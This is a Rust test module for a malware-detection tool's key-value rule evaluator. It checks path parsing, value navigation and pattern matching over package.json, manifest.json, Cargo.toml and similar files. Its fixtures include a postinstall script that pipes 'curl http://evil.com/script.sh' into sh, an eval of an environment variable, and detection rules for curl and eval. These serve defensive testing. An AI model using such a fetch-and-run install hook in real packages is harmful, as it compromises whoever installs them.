//! Test module.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

//! Tests for key-value condition evaluator
//!
//! Comprehensive test coverage for:
//! - Routing: structured documents reach the values tree
//! - Path parsing (keys, indexes, wildcards)
//! - Value navigation (nested objects, arrays)
//! - Pattern matching (exact, substr, regex, case-insensitive)
//! - Real-world scenarios (package.json, manifest.json, pyproject.toml)

use super::kv::*;
use crate::composite_rules::{Condition, EvaluationContext, FileType, KvQuery};
use crate::types::{AnalysisReport, Evidence, TargetInfo};
use serde_json::json;
use std::path::Path;

/// Evaluate `condition` against `content` as if it were the file at `path`.
fn evaluate_kv_at(condition: &Condition, content: &[u8], path: &Path) -> Option<Evidence> {
    let mut report = AnalysisReport::new(TargetInfo {
        path: path.display().to_string(),
        file_type: "test".to_string(),
        size_bytes: content.len() as u64,
        sha256: "test".to_string(),
        architectures: None,
    });
    report.values_tree = Some(Box::new(
        filefacts::OpenOptions::new()
            .path(path)
            .open(content)
            .values()
            .as_json()
            .clone(),
    ));
    let ctx = EvaluationContext::test_only_new(&report, content, FileType::All);
    evaluate_kv(condition, &ctx)
}

// ==================== Routing ====================

/// Every file shape cleave's own structured-format router used to parse
/// reaches `type: value` rules through filefacts' values tree: identified by
/// name or content, parsed, and addressable by the path a rule would use.
#[test]
fn structured_documents_reach_the_values_tree() {
    const MSBUILD: &str =
        r#"<Project><Target Name="t"><Exec Command="curl x"/></Target></Project>"#;
    const PLIST: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>CFBundleIdentifier</key><string>com.example</string></dict></plist>"#;
    const PBXPROJ: &str = "// !$*UTF8*$!\n{ objects = { A1 = { isa = PBXShellScriptBuildPhase; shellScript = \"curl x\"; }; }; }\n";
    const UNIT: &str = "[Service]\nExecStart=/bin/x\n";
    const PKGINFO: &str = "Metadata-Version: 2.1\nName: declared\n";
    let mut binary_plist = Vec::new();
    let mut dict = plist::Dictionary::new();
    dict.insert("CFBundleIdentifier".into(), "com.example".into());
    plist::Value::Dictionary(dict)
        .to_writer_binary(&mut binary_plist)
        .unwrap();

    let cases: &[(&str, &[u8], &str, serde_json::Value)] = &[
        ("package.json", br#"{"name":"p","scripts":{"postinstall":"x"}}"#, "scripts.postinstall", json!("x")),
        ("package-lock.json", br#"{"name":"p","lockfileVersion":3}"#, "lockfileVersion", json!(3)),
        ("manifest.json", br#"{"manifest_version":3,"name":"e","permissions":["tabs"]}"#, "permissions[0]", json!("tabs")),
        ("composer.json", br#"{"name":"v/p","scripts":{"post-install-cmd":"x"}}"#, "scripts.post-install-cmd", json!("x")),
        (".github/workflows/ci.yaml", b"on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n", "jobs.b.runs-on", json!("ubuntu-latest")),
        (".github/workflows/ci.yml", b"on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n", "jobs.b.runs-on", json!("ubuntu-latest")),
        ("action.yml", b"name: a\nruns:\n  using: node20\n", "runs.using", json!("node20")),
        ("Cargo.toml", b"[package]\nname = \"c\"\nbuild = \"build.rs\"\n", "package.build", json!("build.rs")),
        ("pyproject.toml", b"[project]\nname = \"p\"\n", "project.name", json!("p")),
        ("evil.service", UNIT.as_bytes(), "service.exec_start", json!("/bin/x")),
        ("evil.service.d/override.conf", UNIT.as_bytes(), "service.exec_start", json!("/bin/x")),
        ("app.desktop", b"[Desktop Entry]\nExec=x\n", "desktop_entry.exec", json!("x")),
        ("PKG-INFO", PKGINFO.as_bytes(), "name", json!("declared")),
        ("METADATA", PKGINFO.as_bytes(), "name", json!("declared")),
        ("Info.plist", PLIST.as_bytes(), "CFBundleIdentifier", json!("com.example")),
        ("unnamed", PLIST.as_bytes(), "CFBundleIdentifier", json!("com.example")),
        ("unnamed", &binary_plist, "CFBundleIdentifier", json!("com.example")),
        ("project.pbxproj", PBXPROJ.as_bytes(), "objects[*].shellScript", json!("curl x")),
        ("unnamed", PBXPROJ.as_bytes(), "objects[*].shellScript", json!("curl x")),
        ("unnamed", br#"<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="t"><Exec Command="curl x"/></Target></Project>"#, "Project.Target.Exec.@Command", json!("curl x")),
    ];
    for &(name, content, path, ref expected) in cases {
        let tree = filefacts::OpenOptions::new()
            .path(Path::new(name))
            .open(content)
            .values()
            .as_json()
            .clone();
        let found = navigate(&tree, &parse_path(path).unwrap());
        assert_eq!(found, vec![expected], "{name}: {path} in {tree}");
    }
    for ext in [
        "xml", "csproj", "vbproj", "fsproj", "vcxproj", "proj", "props", "targets", "xaml",
    ] {
        let name = format!("build.{ext}");
        let tree = filefacts::OpenOptions::new()
            .path(Path::new(&name))
            .open(MSBUILD.as_bytes())
            .values()
            .as_json()
            .clone();
        let found = navigate(&tree, &parse_path("Project.Target.Exec.@Command").unwrap());
        assert_eq!(found, vec![&json!("curl x")], "{name}");
    }
}

// ==================== Path Parsing Tests ====================

#[test]
fn test_parse_path_single_key() {
    let segments = parse_path("name").unwrap();
    assert_eq!(segments, vec![PathSegment::Key("name".to_string())]);
}

#[test]
fn test_parse_path_nested_keys() {
    let segments = parse_path("a.b.c").unwrap();
    assert_eq!(
        segments,
        vec![
            PathSegment::Key("a".to_string()),
            PathSegment::Key("b".to_string()),
            PathSegment::Key("c".to_string()),
        ]
    );
}

#[test]
fn test_parse_path_array_index() {
    let segments = parse_path("items[0]").unwrap();
    assert_eq!(
        segments,
        vec![PathSegment::Key("items".to_string()), PathSegment::Index(0),]
    );
}

#[test]
fn test_parse_path_wildcard() {
    let segments = parse_path("items[*]").unwrap();
    assert_eq!(
        segments,
        vec![PathSegment::Key("items".to_string()), PathSegment::Wildcard,]
    );
}

#[test]
fn test_parse_path_complex() {
    let segments = parse_path("content_scripts[*].matches[0]").unwrap();
    assert_eq!(
        segments,
        vec![
            PathSegment::Key("content_scripts".to_string()),
            PathSegment::Wildcard,
            PathSegment::Key("matches".to_string()),
            PathSegment::Index(0),
        ]
    );
}

#[test]
fn test_parse_path_multiple_wildcards() {
    let segments = parse_path("a[*].b[*].c").unwrap();
    assert_eq!(
        segments,
        vec![
            PathSegment::Key("a".to_string()),
            PathSegment::Wildcard,
            PathSegment::Key("b".to_string()),
            PathSegment::Wildcard,
            PathSegment::Key("c".to_string()),
        ]
    );
}

#[test]
fn test_parse_path_root_array() {
    let segments = parse_path("[0]").unwrap();
    assert_eq!(segments, vec![PathSegment::Index(0)]);
}

#[test]
fn test_parse_path_empty() {
    let result = parse_path("");
    assert!(result.is_err(), "Empty path should be an error");
}

#[test]
fn test_parse_path_trailing_dot() {
    let result = parse_path("items.");
    // Trailing dots are allowed - they're just ignored
    assert!(result.is_ok());
}

#[test]
fn test_parse_path_invalid_index() {
    let result = parse_path("items[abc]");
    assert!(result.is_err(), "Non-numeric index should be an error");
}

// ==================== Navigation Tests ====================

#[test]
fn test_navigate_single_key() {
    let value = json!({"name": "test"});
    let segments = parse_path("name").unwrap();
    let results = navigate(&value, &segments);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0], &json!("test"));
}

#[test]
fn test_navigate_nested_keys() {
    let value = json!({"a": {"b": {"c": "value"}}});
    let segments = parse_path("a.b.c").unwrap();
    let results = navigate(&value, &segments);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0], &json!("value"));
}

#[test]
fn test_navigate_array_index() {
    let value = json!({"items": ["first", "second", "third"]});
    let segments = parse_path("items[1]").unwrap();
    let results = navigate(&value, &segments);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0], &json!("second"));
}

#[test]
fn test_navigate_wildcard() {
    let value = json!({"items": ["a", "b", "c"]});
    let segments = parse_path("items[*]").unwrap();
    let results = navigate(&value, &segments);
    assert_eq!(results.len(), 3);
    assert_eq!(results[0], &json!("a"));
    assert_eq!(results[1], &json!("b"));
    assert_eq!(results[2], &json!("c"));
}

#[test]
fn test_navigate_wildcard_nested() {
    let value = json!({
        "users": [
            {"name": "alice", "role": "admin"},
            {"name": "bob", "role": "user"}
        ]
    });
    let segments = parse_path("users[*].name").unwrap();
    let results = navigate(&value, &segments);
    assert_eq!(results.len(), 2);
    assert_eq!(results[0], &json!("alice"));
    assert_eq!(results[1], &json!("bob"));
}

#[test]
fn test_navigate_missing_key() {
    let value = json!({"name": "test"});
    let segments = parse_path("missing").unwrap();
    let results = navigate(&value, &segments);
    assert_eq!(results.len(), 0, "Should return empty for missing key");
}

#[test]
fn test_navigate_out_of_bounds_index() {
    let value = json!({"items": ["a", "b"]});
    let segments = parse_path("items[5]").unwrap();
    let results = navigate(&value, &segments);
    assert_eq!(results.len(), 0, "Should return empty for out of bounds");
}

#[test]
fn test_navigate_index_on_non_array() {
    let value = json!({"items": "not an array"});
    let segments = parse_path("items[0]").unwrap();
    let results = navigate(&value, &segments);
    assert_eq!(
        results.len(),
        0,
        "Should return empty when indexing non-array"
    );
}

#[test]
fn test_navigate_key_on_non_object() {
    let value = json!({"items": [1, 2, 3]});
    let segments = parse_path("items.name").unwrap();
    let results = navigate(&value, &segments);
    assert_eq!(
        results.len(),
        0,
        "Should return empty when accessing key on array"
    );
}

// ==================== Matcher Tests ====================

#[test]
fn test_matcher_exact_match() {
    let matcher = KvMatcher::new(Some(&"test".to_string()), None, None, false, None, None);
    assert!(matcher.matches(&json!("test")));
    assert!(!matcher.matches(&json!("other")));
}

#[test]
fn test_matcher_exact_case_insensitive() {
    let matcher = KvMatcher::new(Some(&"TEST".to_string()), None, None, true, None, None);
    assert!(matcher.matches(&json!("test")));
    assert!(matcher.matches(&json!("TEST")));
    assert!(matcher.matches(&json!("TeSt")));
}

#[test]
fn test_matcher_substr_match() {
    let matcher = KvMatcher::new(None, Some(&"curl".to_string()), None, false, None, None);
    assert!(matcher.matches(&json!("curl https://evil.com")));
    assert!(matcher.matches(&json!("use curl to download")));
    assert!(!matcher.matches(&json!("wget only")));
}

#[test]
fn test_matcher_substr_case_insensitive() {
    let matcher = KvMatcher::new(None, Some(&"CURL".to_string()), None, true, None, None);
    assert!(matcher.matches(&json!("curl https://evil.com")));
    assert!(matcher.matches(&json!("CURL -O file")));
}

#[test]
fn test_matcher_regex() {
    let regex = crate::composite_rules::condition::cached_regex(r"https?://.*\.com").unwrap();
    let matcher = KvMatcher::new(None, None, Some(&regex), false, None, None);
    assert!(matcher.matches(&json!("http://example.com")));
    assert!(matcher.matches(&json!("https://evil.com")));
    assert!(!matcher.matches(&json!("ftp://example.com")));
}

#[test]
fn test_matcher_array_any_match() {
    let matcher = KvMatcher::new(Some(&"admin".to_string()), None, None, false, None, None);
    let array = json!(["user", "admin", "guest"]);
    assert!(
        matcher.matches(&array),
        "Should match if any element matches"
    );
}

#[test]
fn test_matcher_array_no_match() {
    let matcher = KvMatcher::new(
        Some(&"superuser".to_string()),
        None,
        None,
        false,
        None,
        None,
    );
    let array = json!(["user", "admin", "guest"]);
    assert!(!matcher.matches(&array));
}

#[test]
fn test_matcher_existence_check() {
    let matcher = KvMatcher::new(None, None, None, false, None, None);
    assert!(matcher.matches(&json!("anything")));
    assert!(matcher.matches(&json!(123)));
    assert!(matcher.matches(&json!(true)));
    assert!(matcher.matches(&json!(null)));
}

#[test]
fn test_matcher_number_conversion() {
    let matcher = KvMatcher::new(Some(&"42".to_string()), None, None, false, None, None);
    assert!(matcher.matches(&json!(42)));
    assert!(matcher.matches(&json!("42")));
}

#[test]
fn test_matcher_boolean_conversion() {
    let matcher = KvMatcher::new(Some(&"true".to_string()), None, None, false, None, None);
    assert!(matcher.matches(&json!(true)));
    assert!(matcher.matches(&json!("true")));
}

// ==================== Integration Tests ====================

#[test]
fn test_evaluate_kv_package_json_permissions() {
    let content = br#"{
        "name": "suspicious-package",
        "version": "1.0.0",
        "permissions": ["debugger", "tabs", "cookies"]
    }"#;
    let path = Path::new("package.json");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "permissions".to_string(),
        exact: Some("debugger".to_string()),
        substr: None,
        regex: None,
        case_insensitive: false,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(result.is_some(), "Should detect debugger permission");
    let evidence = result.unwrap();
    assert_eq!(evidence.method, "value");
    assert!(evidence.value.contains("debugger"));
}

#[test]
fn test_evaluate_kv_manifest_all_urls() {
    let content = br#"{
        "manifest_version": 3,
        "content_scripts": [
            {
                "matches": ["<all_urls>"],
                "js": ["inject.js"]
            }
        ]
    }"#;
    let path = Path::new("manifest.json");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "content_scripts[*].matches".to_string(),
        exact: Some("<all_urls>".to_string()),
        substr: None,
        regex: None,
        case_insensitive: false,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(result.is_some(), "Should detect <all_urls> access");
}

#[test]
fn test_evaluate_kv_package_json_postinstall() {
    let content = br#"{
        "name": "malicious",
        "scripts": {
            "postinstall": "curl http://evil.com/script.sh | sh"
        }
    }"#;
    let path = Path::new("package.json");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "scripts.postinstall".to_string(),
        exact: None,
        substr: Some("curl".to_string()),
        regex: None,
        case_insensitive: false,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(result.is_some(), "Should detect curl in postinstall");
}

#[test]
fn test_evaluate_kv_yaml_format() {
    let content = b"name: test-workflow\njobs:\n  build:\n    runs-on:\n      - ubuntu-latest\n      - self-hosted\n";
    let path = Path::new(".github/workflows/test.yaml");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "jobs.build.runs-on".to_string(),
        exact: Some("self-hosted".to_string()),
        substr: None,
        regex: None,
        case_insensitive: false,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(
        result.is_some(),
        "Should parse YAML and detect self-hosted runner"
    );
}

#[test]
fn test_evaluate_kv_toml_format() {
    let content = b"[package]\nname = \"test\"\nversion = \"1.0.0\"\n\n[dependencies]\nevil-package = \"*\"\n";
    let path = Path::new("Cargo.toml");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "dependencies.evil-package".to_string(),
        exact: None,
        substr: None,
        regex: None,
        case_insensitive: false,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(
        result.is_some(),
        "Should parse TOML and detect evil-package"
    );
}

#[test]
fn test_evaluate_kv_nonexistent_path() {
    let content = br#"{"name": "test"}"#;
    let path = Path::new("package.json");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "nonexistent.path".to_string(),
        exact: Some("value".to_string()),
        substr: None,
        regex: None,
        case_insensitive: false,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(result.is_none(), "Should return None for nonexistent path");
}

#[test]
fn test_evaluate_kv_invalid_json() {
    let content = b"not valid json {[}]";
    let path = Path::new("package.json");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "name".to_string(),
        exact: Some("test".to_string()),
        substr: None,
        regex: None,
        case_insensitive: false,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(result.is_none(), "Should return None for invalid JSON");
}

#[test]
fn test_evaluate_kv_regex_pattern() {
    let content = br#"{
        "scripts": {
            "test": "eval(process.env.MALICIOUS_CODE)"
        }
    }"#;
    let path = Path::new("package.json");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "scripts.test".to_string(),
        exact: None,
        substr: None,
        regex: Some(r"eval\s*\(".to_string()),
        case_insensitive: false,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(result.is_some(), "Should detect eval pattern");
}

#[test]
fn test_evaluate_kv_case_insensitive() {
    let content = br#"{"name": "TEST-PACKAGE"}"#;
    let path = Path::new("package.json");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "name".to_string(),
        exact: None,
        substr: Some("test".to_string()),
        regex: None,
        case_insensitive: true,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(result.is_some(), "Should match case-insensitively");
}

#[test]
fn test_evaluate_kv_multiple_wildcards() {
    let content = br#"{
        "name": "test-extension",
        "features": [
            {"permissions": ["read", "write"]},
            {"permissions": ["admin", "root"]}
        ]
    }"#;
    let path = Path::new("manifest.json");

    let condition = Condition::Kv(KvQuery {
        match_mode: Default::default(),
        path: "features[*].permissions[*]".to_string(),
        exact: Some("root".to_string()),
        substr: None,
        regex: None,
        case_insensitive: false,
        ..Default::default()
    });

    let result = evaluate_kv_at(&condition, content, path);
    assert!(
        result.is_some(),
        "Should navigate through multiple wildcards"
    );
}
